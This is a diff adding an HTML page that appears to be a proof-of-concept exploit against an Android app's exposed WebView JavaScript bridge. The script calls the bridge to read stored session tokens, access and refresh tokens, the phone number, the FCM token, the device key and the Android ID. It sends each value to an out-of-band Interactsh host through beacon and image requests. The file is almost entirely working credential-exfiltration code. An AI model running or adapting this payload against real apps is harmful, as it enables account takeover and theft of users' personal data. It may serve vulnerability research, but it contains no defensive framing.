@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>dump</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:16px;">
+<pre id="log">bridge: detecting...</pre>
+<script>
+const OAST = "kyfcridixbvmtsbeaesvfl6m2tbevou5m.oast.fun";
+
+function leak(k, v) {
+  var b = new Blob([JSON.stringify({k:k, v:v, t:Date.now()})], {type:"text/plain"});
+  navigator.sendBeacon("https://"+OAST+"/"+encodeURIComponent(k), b);
+  new Image().src = "https://"+OAST+"/img?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).substring(0,1800));
+}
+
+function dump() {
+  var b = window.mocamocaJs;
+  if (!b) { log.textContent = "NO BRIDGE"; return; }
+  log.textContent = "bridge: OK — dumping...";
+
+  // SharedPreferences keys to probe
+  var keys = [
+    "FCM_TOKEN", "MAIN_URL", "local_number", "local_number_enable",
+    "isNative", "JSBRIDGE_NAME", "TEST_URL", "APP_FIRST_OPEN",
+    "assets_version", "loop_interval", "fullscreen",
+    "user_token", "session_id", "access_token", "refresh_token",
+    "phone_number", "device_key", "apps_flyer_shared_preference"
+  ];
+
+  for (var i=0; i<keys.length; i++) {
+    try {
+      var v = b.getSp(keys[i]);
+      if (v && v !== "" && v !== "defaultEmpty") {
+        var prefix = "SP:" + keys[i];
+        log.textContent += "\n  " + prefix + " = " + v;
+        leak(prefix, v);
+      }
+    } catch(e) {}
+  }
+
+  // FCM token via async callback
+  window._fcm = function(token) {
+    log.textContent += "\n  FCM_TOKEN(async) = " + token;
+    leak("FCM_TOKEN_async", token);
+  };
+  try { b.getFCMToken("_fcm"); } catch(e) {}
+
+  // Device key
+  try { leak("DeviceKey", b.getDeviceKey()); } catch(e) {}
+  try { leak("AndroidId", b.getAndroidId()); } catch(e) {}
+
+  log.textContent += "\n\ndone — check Interactsh";
+}
+
+dump();
+</script>
+</body>
+</html>
